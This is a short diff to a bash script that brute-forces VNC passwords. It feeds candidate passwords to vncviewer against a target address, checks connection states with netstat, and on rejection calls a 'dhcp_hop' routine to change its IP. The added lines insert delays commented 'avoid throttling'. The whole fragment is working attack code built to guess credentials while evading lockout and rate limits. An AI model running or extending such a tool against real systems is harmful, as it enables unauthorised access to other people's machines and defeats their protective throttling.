@@ -58,13 +58,16 @@ then
 		pws=$((pws+1))
 		echo "Trying: ${line}"
 		vncviewer -passwd <(vncpasswd -f <<<"$line") $ipadd:$port > stdout.txt 2>&1 &
+		sleep 1 # avoid throttling
 		if netstat -na | grep 5900 | grep "TIME_WAIT"
 		then
 			pkill -f "vncviewer"
-			tcpkill host $ipadd
+			cat stdout.txt
 			if grep -q "rejected" stdout.txt
-			then
+			then	
+				sleep 1 #must wait for query timeout
 				dhcp_hop
+				echo $(hostname -I)
 			fi
 		elif netstat -na | grep 5900 | grep ESTABLISHED
 		then
